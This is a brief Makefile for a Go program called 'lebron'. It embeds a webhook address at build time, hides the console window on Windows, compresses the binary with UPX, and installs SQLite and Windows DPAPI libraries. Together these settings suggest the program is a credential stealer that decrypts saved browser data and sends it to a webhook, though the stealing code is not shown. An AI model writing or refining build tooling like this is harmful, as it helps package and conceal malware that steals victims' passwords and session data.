WEBHOOK ?= ""
COMPRESSION_LEVEL ?= 7
ifeq ($(OS), Windows_NT)
	SHELL=C:\Windows\System32\cmd.exe
endif
build: go.mod go.sum lebron.go
	go build -ldflags="-H=windowsgui -X 'main.WEBHOOK=$(WEBHOOK)'" lebron.go
	upx -$(COMPRESSION_LEVEL) lebron.exe
setup:
	go mod init lebron
	go get github.com/mattn/go-sqlite3
	go get github.com/billgraziano/dpapi
clean: go.mod go.sum
	del /Q go.mod go.sum
